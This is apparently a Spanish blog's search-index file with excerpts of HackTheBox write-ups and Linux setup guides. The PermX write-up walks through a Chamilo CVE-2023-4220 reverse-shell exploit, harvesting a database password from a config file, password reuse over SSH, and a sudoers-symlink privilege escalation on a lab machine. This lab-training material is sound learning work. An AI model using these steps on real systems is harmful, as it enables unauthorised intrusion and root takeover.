var store = [{
        "title": "Máquina Headless de HackTheBox con dificultad fácil",
        "excerpt":"     En esta máquina primero que nada se tuvo que hacer un análisis para poder obtener información sobre los puertos que estaba abierto para ello se llevó a cabo el uso NMAP, en el cual se hace con el siguiente comando:   nmap -p- -sC -vvv –min-rate 5000 -n 10.10.11.8            -p-: Este parámetro indica que Nmap debe escanear todos los puertos, del 1 al 65535. Normalmente, Nmap escanea solo los 1000 puertos más comunes si no se especifica ningún rango de puertos.            -sC: Este parámetro habilita el uso de los scripts Nmap Scripting Engine (NSE) con la opción de script predeterminado. Los scripts NSE pueden realizar una variedad de tareas, como la detección de versiones de servicios y la identificación de vulnerabilidades.            -vvv: Este parámetro aumenta la verbosidad del escaneo, proporcionando información detallada sobre el progreso del escaneo y los resultados. Cuantos más “v” se añadan, más detallada será la salida.            –-min-rate 5000: Este parámetro establece la tasa mínima de paquetes por segundo que Nmap debería enviar, en este caso, 5000 paquetes por segundo. Esto hace que el escaneo sea más rápido, pero puede generar tráfico de red considerable y posiblemente ser detectado como un comportamiento sospechoso por sistemas de detección de intrusos (IDS).            -n: Este parámetro deshabilita la resolución de nombres de dominio inversa. Esto significa que Nmap no intentará resolver direcciones IP a nombres de host, lo que puede acelerar el escaneo.       Resultados obtenidos:        En la captura podemos ver que solo tenemos abiertos dos puertos el cual uno es el puerto 22 y el otro el 5000, cual sabemos las siguientes características:   Puerto 22      Protocolo: TCP   Servicio común: SSH (Secure Shell)   Uso principal: El puerto 22 es conocido por el protocolo SSH, que proporciona una forma segura de conectarse a otro ordenador a través de una red no segura. SSH permite el acceso remoto a servidores, la transferencia segura de archivos mediante SCP (Secure Copy) y SFTP (SSH File Transfer Protocol), así como la ejecución remota de comandos. SSH es esencial en la administración de sistemas y servidores, especialmente en entornos Linux y Unix.   Puerto 5000      Protocolo: TCP/UDP   Servicios comunes:            UPnP (Universal Plug and Play): Este protocolo, utilizado principalmente en redes domésticas, permite que dispositivos en una red se descubran y se comuniquen automáticamente entre sí. UPnP facilita la configuración de redes y la conectividad entre dispositivos sin intervención manual significativa.       Docker: En el contexto de Docker, un sistema de contenedores de aplicaciones, el puerto 5000 se usa comúnmente como el puerto predeterminado para el registro privado de Docker (Docker Registry). Un Docker Registry es un repositorio para almacenar y distribuir imágenes Docker.       Flask: En el desarrollo web con Python, el marco Flask puede usar el puerto 5000 como su puerto predeterminado para ejecutar aplicaciones web durante el desarrollo.           Uso principal: Dado que el puerto 5000 no está asignado de manera oficial a un servicio específico por la IANA (Internet Assigned Numbers Authority), puede ser utilizado por diferentes aplicaciones y servicios según las necesidades de los usuarios y desarrolladores. Sin embargo, los usos mencionados arriba son algunos de los más comunes.   A continuación, procedemos a obtener más información de los puertos usando nmap esto se hace principalmente para que no se demore demasiado tiempo en obtener la información:   nmap -p22,5000 -A -Pn -vvv 10.10.11.8      -p22,5000: Esta opción especifica los puertos que deseas escanear. En este caso, Nmap escaneará los puertos 22 (usualmente usado por SSH) y 5000. Puedes especificar un rango de puertos o una lista separada por comas.   -A: Esta opción activa la detección avanzada. Incluirá:            Detección de sistema operativo.       Detección de versión de servicio.       Escaneo de scripts.       Rastreo de ruta (traceroute).           -Pn: Esta opción le dice a Nmap que no haga un “ping” previo a los hosts para ver si están activos. Por defecto, Nmap hace un ping para determinar si un host está activo antes de escanearlo. Con -Pn, Nmap escaneará los puertos incluso si el host no responde a los pings.        En esta captura podemos ver algo interesante, primero que nada, podemos ver que en el puerto 22 si bien nos muestra la versión en el cual está trabajando el problema radica que no hay vulnerabilidad aparente, es decir si va al internet no hay ningún tipo de exploit que se puede usar para conectarse, así que el único puerto que queda disponible es el 5000 sin embargo este solo se usa para alojar el acceso a la página web así que no hay manera de explotar una vulnerabilidad.   Solo queda ingresar a la página:        En este caso procedemos a buscar páginas que puedan estar ocultas apartir de la URL, para eso usamos FUZZ        ","categories": ["HackTheBox"],
        "tags": ["puerto 5000","nmap"],
        "url": "/hackthebox/Maquina-Headless/",
        "teaser": "/assets/images/MaquinaHeadless/headless.png"
      },{
        "title": "Personalización de un entorno de trabajo Linux.",
        "excerpt":"Personalización de la terminal  Instalación de  ZSH para eso vamos a usar el siguiente comando:      Debian o Ubuntu     sudo apt install zsh           ArchLinux     sudo apt -S zsh          Opcionalmente, se puede instalar oh-my-zsh       sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"   Powerlevel10k  El tema preferido para la terminal es powerlevel10k   Guía de instalación.     Fuentes que se deben instalar:            MesloLGS fuentes que recomienda el autor:                    MesloLGS NF Regular.ttf           MesloLGS NF Bold.ttf           MesloLGS NF Italic.ttf           MesloLGS NF Bold Italic.ttf                       Hack Nerd Fonts                    Hack Nerd Fonts                            Instalación manual funciona en cualquier distribución                   sudo mv Hack.zip /usr/share/fonts   cd /usr/share/fonts   sudo unzip Hack.zip   sudo rm Hack.zip                                               Instalación automática en ArchLinux                 yay -S ttf-hack-nerd                                                                                   Instalación            Manual:           git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ~/powerlevel10k   echo 'source ~/powerlevel10k/powerlevel10k.zsh-theme' &gt;&gt;~/.zshrc                       Usando Oh My Zsh           git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k                  En el archivo ~/.zshrc se debe agregar el tema en el caso de a ver usado Oh My Zsh ZSH_THEME=\"powerlevel10k/powerlevel10k\"               Para restaurar ZSH se debe usar el siguiente comando:           exec zsh                       Para modificar el tema se usa:           p10k configure                           Instalación de plugins  Hay dos plugin muy usados cuáles son:     zsh-autosuggestions     git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions           zsh-syntax-highlighting     git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting            En el archivo .zshrc se modificará lo siguiente:   plugins=(git     zsh-autosuggestions     zsh-syntax-highlighting  )  Finalmente tendremos la siguiente terminal y nos quedaría de la siguiente manera:       Configuración de alias   Alias de bat  En este caso se utiliza la herramienta bat la cual tiene una función parecida al comando cat, sin embargo, este tiene una presentación más elegante y más visual, por lo cual se opta por modificar el comando cat usando el alias en .zshrc   Instalación de la herramienta   Para la instalación de esta herramienta, se puede usar uno de los siguientes métodos:   En Ubuntu/Debian:     Instalación mediante el gestor de paquetes:      sudo apt install bat           Instalación manual descargando la última versión:      sudo apt install ./nombre_del_archivo.deb           En Arch Linux:     Instalación mediante el gestor de paquetes pacman:      sudo pacman -S bat           Instalación manual desde el AUR utilizando un ayudante como yay:      yay -S bat           Dentro del archivo .zshrc se agrega el siguiente alias:  alias cat='/bin/bat' alias catn='/bin/cat' alias  catln='/bin/bat --paging=never'  Así es como se ve nuestra terminal usando esta herramienta:      En algunos casos se necesita copiar cosas de la terminal, así que para eso se configuró otro alias como catn       Alias de lsd   lsd es una versión mejorada del comando ls, que incluye colores y otros elementos visuales para mejorar la experiencia de usuario. A continuación, se presentan alias que puedes agregar a tu archivo .zshrc para sustituir el uso de ls por lsd:   Instalación de la herramienta   En Ubuntu/Debian:     Instalación mediante el gestor de paquetes:      sudo apt install lsd           Instalación manual descargando la última versión:      sudo dpkg -i ./nombre_del_archivo.deb           En Arch Linux:     Instalación mediante el gestor de paquetes pacman:      sudo pacman -S lsd           Instalación manual desde el AUR utilizando un ayudante como yay:      yay -S lsd           Dentro del archivo .zshrc se agregan los siguientes alias:  alias ls='lsd' alias l='ls -l' alias la='ls -a' alias lla='ls -la' alias lt='ls --tree'   Así es como se ve nuestra terminal usando esta herramienta:             Configuración de .zshrc  Esta es la configuración final .zshrc    if [[ -r \"${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh\" ]]; then   source \"${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh\" fi  # Path to your Oh My Zsh installation. export ZSH=\"$HOME/.oh-my-zsh\"  ZSH_THEME=\"powerlevel10k/powerlevel10k\" plugins=(git     zsh-autosuggestions     zsh-syntax-highlighting  )  source $ZSH/oh-my-zsh.sh  # User configuration ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern cursor) ZSH_HIGHLIGHT_STYLES[command]='fg=blue,bold' ZSH_HIGHLIGHT_STYLES[builtin]='fg=green,bold'  # Example aliases # alias zshconfig=\"mate ~/.zshrc\" # alias ohmyzsh=\"mate ~/.oh-my-zsh\"  alias ls='lsd' alias l='ls -l' alias la='ls -a' alias lla='ls -la' alias lt='ls --tree'  alias cat='/bin/bat' alias catn='/bin/cat' alias  catln='/bin/bat --paging=never'  # To customize prompt, run `p10k configure` or edit ~/.p10k.zsh. [[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh  Aplicación para el usuario root  Si deseas que estos alias también estén disponibles para el usuario root, puedes seguir los mismos pasos anteriores. Alternativamente, puedes crear un enlace simbólico del archivo .zshrc de tu usuario hacia el directorio del root:   sudo ln -s ~/.zshrc /root/.zshrc  Si encuentras un error al crear el enlace, es posible que ya exista un archivo .zshrc en el directorio del root. En ese caso, puedes eliminar el archivo .zshrc del root y luego intentar nuevamente:   sudo rm /root/.zshrc   Para mejorar la visibilidad y distinguir fácilmente en qué usuario estás, puedes personalizar el color del prompt. Esto se puede lograr editando el archivo .p10k.zsh de la siguiente manera:        En el archivo .p10k.zsh, busca la línea 220, donde por defecto verás el valor 31. Reemplaza este valor con la palabra red. De manera similar, en la línea 230, sustituye el valor 39 también por red.   Cerrando la terminal o saliendo del usuario root tendríamos de la siguiente manera:       ","categories": ["Linux"],
        "tags": ["Linux","Personalización"],
        "url": "/linux/Personalizacion/",
        "teaser": "/assets/images/PersonalizacionLinux/painter-penguin.svg"
      },{
        "title": "Máquina PermX de HackTheBox con dificultad fácil",
        "excerpt":"Recocimiento   Esta máquina está clasificada como fácil y no puedo decir lo contrario. Lo primero que se hace es un escaneo usando nmap con la siguiente línea de código:    nmap -p- --min-rate 5000 -n --open -vvv -sS -oG allPorts 10.10.11.23   EEl escaneo nos arrojó que están abiertos dos puertos, el 22 y el 80, algo muy común para un servidor que aloja un servicio web. Para ello, vamos a escanear de manera exhaustiva los puertos con el siguiente comando:     nmap -sCV -p22,80 -oN Ports 10.10.11.23   Nos arroja la siguiente información:   # Nmap 7.94SVN scan initiated Thu Jul 11 16:02:33 2024 as: nmap -sCV -p22,80 -oN Ports 10.10.11.23 Nmap scan report for 10.10.11.23 Host is up (0.34s latency).  PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA) |_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519) 80/tcp open  http    Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://permx.htb |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/   Debemos agregar al archivo hosts la dirección y su enlace:   sudo nano /etc/hosts  En el archivo se agrega lo siguiente:   10.10.11.23     permx.htb  Una vez guardados los cambios, vamos a nuestro navegador y analizamos la página:         Navegando en la página, no encontramos nada en lo cual se pueda comenzar un ataque, así que ahora procedemos a usar la herramienta `ffuf` para encontrar posibles páginas ocultas.    ❯ ffuf -u http://permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt          /'___\\  /'___\\           /'___\\               /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/               \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\               \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/                \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                  \\/_/    \\/_/   \\/___/    \\/_/                v2.1.0-dev ________________________________________________   :: Method           : GET  :: URL              : http://permx.htb/FUZZ  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt  :: Follow redirects : false  :: Calibration      : false  :: Timeout          : 10  :: Threads          : 40  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________  .htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 138ms] .htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 140ms] css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 226ms] img                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 205ms] js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 160ms] lib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 125ms] server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 129ms] :: Progress: [20476/20476] :: Job [1/1] :: 162 req/sec :: Duration: [0:01:29] :: Errors: 0 ::     Con el escaneo encontramos diversas páginas:     http://permx.htb/css/   http://permx.htb/img/   http://permx.htb/js/   http://permx.htb/lib/    Pero hay un problema, en ninguna de estas se encontró nada interesante, así que procedemos a buscar alguna página asociada o subdominio, es decir, host distinto que un usuario tenga que iniciar sesión. Para ello, vamos a usar fuzz de otra manera.     ❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://permx.htb -H \"Host: FUZZ.permx.htb\" -fc 302          /'___\\  /'___\\           /'___\\               /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/               \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\               \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/                \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                  \\/_/    \\/_/   \\/___/    \\/_/                v2.1.0-dev ________________________________________________   :: Method           : GET  :: URL              : http://permx.htb  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  :: Header           : Host: FUZZ.permx.htb  :: Follow redirects : false  :: Calibration      : false  :: Timeout          : 10  :: Threads          : 40  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  :: Filter           : Response status: 302 ________________________________________________  www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 510ms] lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 270ms] [WARN] Caught keyboard interrupt (Ctrl-C)    Como podemos ver, encontramos dos subdominios, los cuales son:     http://www.permx.htb/   http://lms.permx.htb/   De estos subdominios, el que realmente es interesante es el segundo (lms.permx.htb), en este podemos encontrar el panel de inicio de sesión el cual usa Chamilo:          En esta página podemos encontrar un inicio de sesión. Probamos con credenciales típicas como admin - admin, pero no tiene fallas de ese estilo. Así como en la página anterior vimos que tenía páginas ocultas, procedemos a buscar si esta cuenta con páginas ocultas:    ❯ ffuf -u http://lms.permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt           /'___\\  /'___\\           /'___\\               /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/               \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\               \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/                \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                  \\/_/    \\/_/   \\/___/    \\/_/                v2.1.0-dev ________________________________________________   :: Method           : GET  :: URL              : http://lms.permx.htb/FUZZ  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt  :: Follow redirects : false  :: Calibration      : false  :: Timeout          : 10  :: Threads          : 40  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________  .htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 220ms] .htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 225ms] LICENSE                 [Status: 200, Size: 35147, Words: 5836, Lines: 675, Duration: 164ms] app                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 176ms] bin                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 290ms] certificates            [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 326ms] documentation           [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 137ms] favicon.ico             [Status: 200, Size: 2462, Words: 3, Lines: 2, Duration: 338ms] main                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 135ms] plugin                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 153ms] robots.txt              [Status: 200, Size: 748, Words: 75, Lines: 34, Duration: 156ms] server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 137ms] src                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 156ms] vendor                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 127ms] web                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 161ms] :: Progress: [20476/20476] :: Job [1/1] :: 47 req/sec :: Duration: [0:01:38] :: Errors: 0 ::    De la misma manera que en la página anterior, encontramos las siguientes páginas:       http://lms.permx.htb/LICENSE/     http://lms.permx.htb/app/     http://lms.permx.htb/bin/     http://lms.permx.htb/certificates/     http://lms.permx.htb/documentation/     http://lms.permx.htb/favicon.ico/     http://lms.permx.htb/main/     http://lms.permx.htb/plugin/     http://lms.permx.htb/robots.txt/     http://lms.permx.htb/src/     http://lms.permx.htb/vendor/     http://lms.permx.htb/web/   Si bien encontramos una variedad de enlaces, ninguno de estos es realmente relevante, ya que, a pesar de encontrar información, esta no es de utilidad ni muestra alguna brecha de seguridad aparente. Así que nos queda investigar si la versión de Chamilo que se utilizó en la página web tiene alguna vulnerabilidad. Para ello, podemos verla en el enlace          http://lms.permx.htb/documentation/, el cual nos muestra la siguiente información:                  Podemos observar que la versión utilizada es Chamilo 1.11. Después de una investigación, hallamos que sí tiene una vulnerabilidad, la cual se puede encontrar como:            CVE-2023-4220           Esta vulnerabilidad nos dice que:        Descripción de la vulnerabilidad         La carga no restringida de archivos en la funcionalidad de carga de archivos grandes en /main/inc/lib/javascript/bigupload/inc/bigUpload.php en Chamilo LMS &lt;= v1.11.24 permite a atacantes no autenticados realizar ataques de cross-site scripting almacenados y obtener la ejecución remota de código a través de la carga de web shell.               Descripción del riesgo         Existe el riesgo de que un atacante remoto no autenticado pueda comprometer completamente el servidor para robar información confidencial, instalar ransomware o pivotar a la red interna.                    Recomendación             Se recomienda actualizar el software afectado a la última versión, que mitiga esta vulnerabilidad.                         Referencia: Chamilo LMS &lt;= 1.11.24 - Remote Code Execution        Explotacion   Una vez entendida la vulnerabilidad, procedemos a buscar un exploit o, en su caso, programarlo. Para fines prácticos, se utiliza el siguiente exploit:           Chamilo LMS Unauthenticated Big Upload File RCE PoC   Clonamos el exploit y accedemos a la carpeta, luego procedemos a ejecutar el siguiente comando:   python3 main.py -u http://lms.permx.htb/ -a revshell  Antes de ejecutar el comando, debemos estar en otra terminal y asegurarnos de haber ejecutado el siguiente comando para escuchar en el puerto:   nc -lnvp [PORT  #Ejemplo nc -nlvp 4444   Si todo fue exitoso, la terminal donde ejecutamos el exploit debería finalizar de la siguiente manera:        Y la terminal que estamos escuchando estaria asi:   ❯ nc -nlvp 4444 listening on [any] 4444 ... connect to [10.10.14.59] from (UNKNOWN) [10.10.11.23] 39654 bash: cannot set terminal process group (1186): Inappropriate ioctl for device bash: no job control in this shell www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$    Después de investigar en la máquina, encontramos la siguiente información:  www-data@permx:/var/www/chamilo/app/config$ ls add_course.conf.dist.php   course_info.conf.php  profile.conf.dist.php add_course.conf.php        events.conf.dist.php  profile.conf.php assetic.yml                events.conf.php       routing.yml auth.conf.dist.php         fos                   routing_admin.yml auth.conf.php              ivory_ckeditor.yml   routing_dev.yml config.yml                 mail.conf.dist.php    routing_front.yml config_dev.yml             mail.conf.php         security.yml config_prod.yml            migrations.yml        services.yml configuration.php          mopa                  sonata course_info.conf.dist.php  parameters.yml.dist  www-data@permx:/var/www/chamilo/app/config$ cat configuration.php   &lt;?php // Chamilo version 1.11.24 // File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000 /* For licensing terms, see /license.txt */ /**  * This file contains a list of variables that can be modified by the campus site's server administrator.  * Pay attention when changing these variables, some changes may cause Chamilo to stop working.  * If you changed some settings and want to restore them, please have a look at  * configuration.dist.php. That file is an exact copy of the config file at install time.  * Besides the $_configuration, a $_settings array also exists, that  * contains variables that can be changed and will not break the platform.  * These optional settings are defined in the database, now  * (table settings_current).  */  // Database connection settings. $_configuration['db_host'] = 'localhost'; $_configuration['db_port'] = '3306'; $_configuration['main_database'] = 'chamilo'; $_configuration['db_user'] = 'chamilo'; $_configuration['db_password'] = '03F6lY3uXAP2bkW8'; // Enable access to database management for platform admins. $_configuration['db_manager_enabled'] = false;    En este caso, podemos encontrar una contraseña. Esta contraseña, en primeras instancias, es para iniciar sesión en la base de datos, pero podemos probar si esta contraseña funciona para conectarnos al usuario encontrado. Este usuario lo encontramos al acceder a la carpeta /home/. Ahí podemos ver ese usuario, así que procederemos a intentar iniciar sesión por SSH.    www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload$ cd /home cd /home www-data@permx:/home$ ls ls mtz www-data@permx:/home$   Para iniciar una conexion ssh procedemos ejecuatar el siguiente comando:  ssh mtz@10.10.11.23  una vez iniciado nos pedira la contrasela la cual insertaremos la que encontramos y soprendentemente es la misma contraseña        Como podemos ver solo tenemos acceso a un archivo el cual nos permitira elevar previlegios   mtz@permx:~$ sudo -l Matching Defaults entries for mtz on permx:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty  User mtz may run the following commands on permx:     (ALL : ALL) NOPASSWD: /opt/acl.sh mtz@permx:~$ cat /opt/acl.sh  #!/bin/bash  if [ \"$#\" -ne 3 ]; then     /usr/bin/echo \"Usage: $0 user perm file\"     exit 1 fi  user=\"$1\" perm=\"$2\" target=\"$3\"  if [[ \"$target\" != /home/mtz/* || \"$target\" == *..* ]]; then     /usr/bin/echo \"Access denied.\"     exit 1 fi  # Check if the path is a file if [ ! -f \"$target\" ]; then     /usr/bin/echo \"Target must be a file.\"     exit 1 fi   Procedimiento para elevar previlegios       Explicación   1- Crear un enlace simbólico:  ln -s /etc/sudoers symlink       ln: Comando para crear enlaces.     -s: Indica que se creará un enlace simbólico (o \"symlink\").     /etc/sudoers: Archivo original al que se creará el enlace.     symlink: Nombre del nuevo enlace simbólico.       Este comando crea un enlace simbólico llamado symlink que apunta al archivo /etc/sudoers. Los enlaces simbólicos son como atajos que apuntan a otro archivo o directorio.    2- Listar archivos con detalles:  ls -l       ls: Comando para listar archivos y directorios.          Este comando mostrará una lista de archivos en el directorio actual, incluida información detallada sobre cada archivo. Entre ellos, se mostrará el enlace simbólico symlink.           -l: Muestra una lista detallada de archivos con permisos, número de enlaces, propietario, grupo, tamaño, fecha de modificación y nombre del archivo.   3- Ejecutar un script con privilegios:  sudo /opt/act.sh mtz rwx /home/mtz/symlink       sudo: Ejecuta un comando con privilegios de superusuario (root).     /opt/act.sh: Ruta al script que se va a ejecutar.     mtz rwx /home/mtz/symlink: Argumentos pasados al script.       Este comando ejecuta el script /opt/act.sh con privilegios elevados, pasando los argumentos mtz, rwx y /home/mtz/symlink. La naturaleza de estos argumentos y el propósito del script dependerá de su contenido.    4- Editar un archivo con nano:  nano /home/mtz/symlink       nano: Editor de texto en la línea de comandos.     /home/mtz/symlink: Archivo que se va a editar.       Este comando abre el archivo /home/mtz/symlink en el editor de texto nano. Como symlink es un enlace simbólico que apunta a /etc/sudoers, estarás editando el archivo real /etc/sudoers.            5- Cambiar a superusuario:  sudo su        sudo: Ejecuta un comando con privilegios de superusuario (root).     su: Cambia de usuario.       Este comando te cambia al usuario root, dándote acceso completo a todo el sistema.    ","categories": ["HackTheBox"],
        "tags": ["puerto 80","nmap"],
        "url": "/hackthebox/permx/",
        "teaser": "/assets/images/MaquinaPermx/permx.webp"
      },{
        "title": "Instalación, configuración y personalización de ArchLinux.",
        "excerpt":"Arch Linux             Arch Linux es una distribución de Linux de propósito general x86-64 desarrollada de forma independiente. Se esfuerza por proporcionar las últimas versiones estables de la mayoría del software, siguiendo un modelo de rolling-release. La instalación por defecto es intencionadamente mínima para que los usuarios puedan añadir solo los paquetes que necesiten.     En este post se abordará la instalación de manera sencilla y la explicación de ciertos detalles que hay que tomar en cuenta a la hora de instalar el sistema. Una mala configuración y/o instalación puede terminar dañando las particiones si se está instalando junto con algún otro sistema operativo.    Descarga  Para descargar Arch Linux, es necesario hacerlo desde su página oficial. No hay un enlace directo para descargar la ISO; en su lugar, se deben utilizar los enlaces Torrent o Magnet.   Descarga de ArchLinux   Podemos ver los enlaces mencionados anteriormente en el apartado BitTorrent Download (recommended):        En este caso se descargo la version de Torrent, para poder descargar este archivo se puede usar uTorrent para Windows o qBittorrent para Linux        Instalación primera parte    Una vez descargada la ISO, procederemos a utilizar Rufus, Ventoy u otro programa similar para grabar la imagen en una memoria USB. Alternativamente, también puedes utilizar la ISO para instalar el sistema en una máquina virtual.  Una vez que hayamos iniciado el sistema, ya sea en la máquina virtual o de manera nativa, nos aparecerá una ventana como la siguiente:        Seleccionaremos la primera opción y presionaremos Enter para iniciar Arch Linux:             Una vez que estemos en la pantalla de bienvenida, estaremos directamente como el usuario root. Lo primero que haremos es usar un comando para configurar el teclado en español. Si no realizamos este paso, el teclado estará configurado en inglés. En caso de contar con un teclado en inglés, no debería representar ningún problema. De lo contrario, utilizaremos el siguiente comando:    loadkey es   Configuración de los discos   Nota: Si se está instalando de manera nativa y se tiene instalado otro sistema operativo como Windows, es necesario hacer los siguientes pasos. De lo contrario, se pueden omitir.    Para la instalación de Arch es necesario tener dos particiones, las cuales son muy importantes a la hora de instalar el sistema. Lo primero que haremos es usar el comando:     lsblk   El comando anterior nos muestra un listado de los discos que tenemos en nuestro sistema. Es recomendable particionar el disco de antemano, ya sea usando el gestor de discos de Windows o alguna herramienta de Linux si se tiene una partición previa. Una vez hecho esto, procederemos a usar el siguiente comando:    cfdisk   Ejemplo de los comandos mencionados anteriormente:        Al ejecutar el comando nos aparece lo siguiente:        Seleccionamos GPT y presionamos Enter. Esto nos llevará a la interfaz de nuestro disco, donde podremos ver todas nuestras particiones. Es importante destacar que cualquier cambio realizado debe ser verificado varias veces antes de escribir los cambios, ya que esto puede dañar las demás particiones. El espacio que vayamos a usar debería aparecer con la leyenda \"Free space\". Como se mencionó anteriormente, este paso debe realizarse desde otro sistema. Cabe aclarar que esto no aplica si se va a instalar Arch en todo el disco.    Con Resize le quitamos 1 GB al disco a utilizar. Esta partición de 1 GB, con Type, se debe seleccionar EFI System. La partición de mayor volumen debe tener el tipo Linux filesystem. Al final, deberíamos tenerlo de esta manera:        Para aguardar los cambios es necesario seleccionar Write y aceptar los cambios    Instalación segunda parte   Continuando con la instalacion procedemos a usar el siguiente comando:  archinstall  Nota: es necesario tener internet para ejecutar este comando   Se nos desplegará lo siguiente:        Aquí es totalmente personalizable, y se deben tomar en cuenta los siguientes datos:      Lenguaje: Puedes dejarlo en inglés o cambiarlo a español.   Mirrors: Son servidores que alojan los paquetes de software y las actualizaciones del sistema. Aquí puedes seleccionar el país de procedencia.   Locales: Aquí se selecciona la distribución del teclado. Si es inglés, puede ser en_US; y si es español, puede ser es_MX para México o es_ES para España. La opción puede variar dependiendo del país.   Configuración de discos: Aquí se desplegarán las siguientes opciones:           La primera opción se utiliza cuando se está usando una máquina virtual o cuando se desea hacer una instalación limpia en un equipo, eliminando todos los datos previos. Al seleccionar esta opción, se mostrará cómo será particionado y formateado el disco. Se debe seleccionar el formato ext4 y guardar los cambios.   La segunda opción consiste en una instalación manual y se aplica solo si ya tienes otro sistema operativo instalado. Para ello, los discos deben estar previamente configurados. Al seleccionar esta opción, aparecerá la siguiente ventana:             Las propiedades que deben tener los discos son:          Disco de 1 GB                    Asignación de punto de montaje: /boot           Formato: Fat32                       Disco de mayor tamaño                    Asignación de punto de montaje: /           Formato: ext4                         Finalmente, deberíamos tenerlo de esta manera:                       Confirma los cambios y sal del menú.       Bootloader: Se deja por defecto en GRUB.   Swap: Se deja por defecto en True.   Hostname: Se puede modificar al otro nombre o se deja por defecto   Root password: Se establece una contraseña exclusiva para root    User account : Se crea una cuenta de usuario aparte del usuario root. Esta cuenta requerirá un nombre de usuario y una contraseña. Además, esta cuenta se añadirá al grupo de wheel para permitir permisos administrativos.   Profile: En esta opción, seleccionamos el entorno gráfico. Aquí podemos elegir entre diferentes entornos de escritorio, como los más conocidos: GNOME, KDE Plasma, entre otros. Asimismo, podemos seleccionar el gestor de inicio de sesión, como GDM, SDDM, etc.   Audio: En esta opción, puedes seleccionar cualquiera de las opciones disponibles, ya que todas funcionan correctamente.   Kernel: Se queda como esta en Linux se tienes mas conocimiento del tema puede seleccionar al gusto.   Networking Configuration: Selecciona la opción de NetworkManager. Es importante que no dejes esta opción sin seleccionar, ya que, de lo contrario, no podrás conectarte a Internet.   Timezone: Se selecciona la zona horaria.   Automatic time sync: Se deja en true.     Optional repositories: Se puede omitir esta opción     Una vez seleccionada la opciones adecuadas lo tendremos de la siguiente manera:          Selecciona la opción de Instalar. Una vez que comience el proceso, se iniciará una cuenta regresiva. Al finalizar esta cuenta regresiva, presiona Enter para comenzar la instalación.    La instalación puede llevar algo de tiempo asi que solo queda esperar. Si todo sale bien nos debe aparecer la 